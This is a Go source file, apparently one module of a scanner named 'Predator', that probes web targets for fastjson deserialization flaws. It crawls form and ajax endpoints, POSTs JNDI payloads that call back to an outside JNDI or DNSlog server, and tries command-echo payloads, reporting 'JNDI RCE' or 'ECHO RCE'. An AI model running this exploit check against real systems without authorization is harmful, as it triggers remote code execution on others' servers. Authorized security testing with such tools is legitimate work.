package fastjson

import (
	"Predator/module/v1/jndi"
	"Predator/pkg/config"
	"Predator/pkg/utils"
	"net/url"
	"regexp"
	"strings"
)

func Check(Url string) string {
	domainx := getinputurl(Url)
	for _, jsonurl := range domainx {
		header := make(map[string]string)
		header["Content-Type"] = "application/json"
		randomstr := utils.RandomStr()

		if (config.CeyeApi != "" && config.CeyeDomain != "") || jndi.JndiAddress != "" {
			for _, payload := range fastjsonJndiPayloads {
				var uri string
				if jndi.JndiAddress != "" {
					uri = jndi.JndiAddress + "/" + randomstr + "/"
				} else if config.CeyeApi != "" && config.CeyeDomain != "" {
					uri = randomstr + "." + config.CeyeDomain
				}
				_, _ = utils.HttpRequset(jsonurl, "POST", strings.Replace(payload, "dnslog-url", uri, -1), false, header)
			}
			if jndi.JndiAddress != "" {
				if jndi.Jndilogchek(randomstr) {
					return "JNDI RCE"
				}
			}
			if config.CeyeApi != "" && config.CeyeDomain != "" {
				if utils.Dnslogchek(randomstr) {
					return "JNDI RCE"
				}
			}
		} else {
			header["module"] = "echo jsonvuln"
			for _, payload := range fastjsonEchoPayloads {
				if req, err := utils.HttpRequset(jsonurl, "POST", payload, false, header); err == nil {
					if strings.Contains(req.Body, "jsonvuln") {
						return "ECHO RCE"
					}
				}
			}
		}
	}
	return ""
}

func getinputurl(domainurl string) (domainurlx []string) {
	req, err := utils.HttpRequset(domainurl, "GET", "", true, nil)
	if err != nil {
		return nil
	}
	var loginurl []string
	loginurl = append(loginurl, domainurl)
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = utils.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
		if err != nil {
			return nil
		}
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if strings.Contains(domainx, "http") {
			loginurl = append(loginurl, domainx)
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(domainurl)
			loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
		} else {
			loginurl = append(loginurl, domainurl+"/"+domainx)
		}
	}
	domainreg2 := regexp.MustCompile(`ajax[\s\S]*?url.*?['|"](.*?)['|"]`)
	domainlist2 := domainreg2.FindAllStringSubmatch(req.Body, -1)
	if domainlist2 != nil {
		for _, a := range domainlist2 {
			domainx := a[1]
			if strings.Contains(domainx, "http") {
				loginurl = append(loginurl, domainx)
			} else if domainx == "" {
				loginurl = append(loginurl, domainurl)
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(domainurl)
				loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
			} else {
				loginurl = append(loginurl, domainurl+"/"+domainx)
			}
		}
	}
	return loginurl
}
